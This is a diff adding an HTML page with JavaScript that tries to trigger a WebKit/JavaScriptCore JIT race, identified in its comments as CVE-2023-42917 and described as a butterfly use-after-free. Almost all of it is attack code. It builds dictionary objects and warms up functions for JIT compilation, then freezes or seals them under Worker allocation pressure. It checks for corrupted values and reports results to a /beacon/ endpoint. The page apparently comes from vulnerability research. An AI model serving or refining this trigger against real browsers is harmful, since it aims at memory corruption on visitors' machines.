@@ -1,0 +1,183 @@
+<!--
+  p602b: Aggressive CVE-2023-42917 race trigger
+
+  JIT confirmed active (p602). Now attempt the race with:
+  1. Object.freeze() / Object.seal() to FORCE flattenDictionaryStructure
+  2. setTimeout staging to let JIT compile between mutation ticks
+  3. Many more iterations (thousands per tick, hundreds of ticks)
+  4. Worker creating allocation pressure to trigger GC + JIT recompilation
+  5. Sentinel-based corruption detection on butterfly content
+
+  CRASH_CLASS: HIGH (butterfly UAF → OOB read/write → likely crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p602b</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+// === Worker for allocation pressure ===
+var workerCode = 'setInterval(function(){var a=[];for(var i=0;i<1000;i++)a.push(new ArrayBuffer(256));a=null;},5);';
+var workerBlob = null;
+var pressureWorker = null;
+try {
+  workerBlob = new Blob([workerCode], {type:'application/javascript'});
+  pressureWorker = new Worker(URL.createObjectURL(workerBlob));
+  b('WORKER:OK');
+} catch(e){ b('WORKER-ERR:'+e.message); }
+
+var totalAnomalies = 0;
+var totalCrashes = 0;
+var totalRounds = 0;
+var tick = 0;
+var MAX_TICKS = 100;
+
+function raceTick(){
+  if(tick >= MAX_TICKS){
+    b('FINAL:ticks='+tick+',rounds='+totalRounds+',anomalies='+totalAnomalies+',crashes='+totalCrashes);
+    if(pressureWorker) pressureWorker.terminate();
+    b('P602B-COMPLETE');
+    return;
+  }
+
+  var tickAnomalies = 0;
+  var ROUNDS_PER_TICK = 20;
+
+  for(var round = 0; round < ROUNDS_PER_TICK; round++){
+    try {
+      // === Strategy A: Object.freeze on dictionary ===
+      var objA = {};
+      // Build fat dictionary (150 properties)
+      for(var p = 0; p < 150; p++) objA['a_' + p] = p * 1.1;
+      // Delete 100 → dictionary with excess butterfly capacity
+      for(var p = 50; p < 150; p++) delete objA['a_' + p];
+
+      // Hot function that JIT will want to compile
+      // Uses the object's properties — JIT will read structure concurrently
+      function hotA(o){
+        var s = 0;
+        for(var k = 0; k < 50; k++) s += o['a_' + k] || 0;
+        return s;
+      }
+
+      // Warm up — enough to trigger DFG tier-up (~100 executions)
+      // DFG compiles after ~60 calls, FTL after ~1000
+      for(var w = 0; w < 200; w++) hotA(objA);
+
+      // NOW freeze while JIT may still be compiling
+      // Object.freeze forces flattenDictionaryStructure + makes unconfigurable
+      var expectedA = 0;
+      for(var k = 0; k < 50; k++) expectedA += k * 1.1;
+
+      try {
+        Object.freeze(objA);
+      } catch(e){}
+
+      // Read after freeze — if butterfly was corrupted, values change
+      var gotA = hotA(objA);
+      if(Math.abs(gotA - expectedA) > 0.01){
+        tickAnomalies++;
+        b('★ANOMALY-A:R'+round+',exp='+expectedA.toFixed(2)+',got='+gotA.toFixed(2)+',delta='+(gotA-expectedA).toFixed(6));
+      }
+
+      // === Strategy B: seal + rapid re-structuring ===
+      var objB = {};
+      for(var p = 0; p < 100; p++) objB['b_' + p] = p;
+      for(var p = 30; p < 100; p++) delete objB['b_' + p];
+
+      function hotB(o){
+        var s = 0;
+        for(var k = 0; k < 30; k++) s += o['b_' + k] || 0;
+        return s;
+      }
+
+      // Warm up
+      for(var w = 0; w < 200; w++) hotB(objB);
+
+      var expectedB = 0;
+      for(var k = 0; k < 30; k++) expectedB += k;
+
+      // Seal — also triggers flatten
+      try { Object.seal(objB); } catch(e){}
+
+      var gotB = hotB(objB);
+      if(Math.abs(gotB - expectedB) > 0.01){
+        tickAnomalies++;
+        b('★ANOMALY-B:R'+round+',exp='+expectedB+',got='+gotB+',delta='+(gotB-expectedB));
+      }
+
+      // === Strategy C: preventExtensions + valueOf trap ===
+      var objC = {};
+      for(var p = 0; p < 120; p++) objC['c_' + p] = p * 2;
+      for(var p = 40; p < 120; p++) delete objC['c_' + p];
+
+      function hotC(o){
+        var s = 0;
+        for(var k = 0; k < 40; k++) s += o['c_' + k] || 0;
+        return s;
+      }
+
+      for(var w = 0; w < 200; w++) hotC(objC);
+
+      var expectedC = 0;
+      for(var k = 0; k < 40; k++) expectedC += k * 2;
+
+      try { Object.preventExtensions(objC); } catch(e){}
+
+      var gotC = hotC(objC);
+      if(Math.abs(gotC - expectedC) > 0.01){
+        tickAnomalies++;
+        b('★ANOMALY-C:R'+round+',exp='+expectedC+',got='+gotC);
+      }
+
+      // === Strategy D: Repeated dictionary transitions ===
+      // Rapidly transition between dictionary and non-dictionary states
+      var objD = {d_0: 0, d_1: 1, d_2: 2, d_3: 3, d_4: 4};
+
+      function hotD(o){ return o.d_0 + o.d_1 + o.d_2 + o.d_3 + o.d_4; }
+
+      for(var w = 0; w < 500; w++) hotD(objD);
+
+      // Rapidly add+delete to force dictionary transitions
+      for(var r = 0; r < 100; r++){
+        objD['_tmp_' + r] = r;
+        delete objD['_tmp_' + r];
+        // Add many then delete to make it a dictionary
+        if(r % 10 === 0){
+          for(var q = 0; q < 50; q++) objD['_batch_' + q] = q;
+          for(var q = 0; q < 50; q++) delete objD['_batch_' + q];
+        }
+        var gotD = hotD(objD);
+        if(gotD !== 10){
+          tickAnomalies++;
+          b('★ANOMALY-D:R'+round+'.'+r+',got='+gotD);
+          break;
+        }
+      }
+
+    } catch(e){
+      totalCrashes++;
+      b('CRASH:tick='+tick+',round='+round+',err='+e.message);
+    }
+  }
+
+  totalAnomalies += tickAnomalies;
+  totalRounds += ROUNDS_PER_TICK;
+
+  // Report every 10 ticks
+  if(tick % 10 === 0){
+    b('TICK:'+tick+'/'+MAX_TICKS+',rounds='+totalRounds+
+      ',anomalies='+totalAnomalies+',crashes='+totalCrashes);
+  }
+
+  tick++;
+  // Use setTimeout to yield to the JIT compiler thread between ticks
+  setTimeout(raceTick, 0);
+}
+
+function main(){
+  b('P602B-AGGRESSIVE-FLATTEN');
+  b('CONFIG:ticks='+MAX_TICKS+',roundsPerTick=20,strategies=ABCD');
+  setTimeout(raceTick, 50);
+}
+
+setTimeout(main, 100);
+</script></head><body>p602b</body></html>
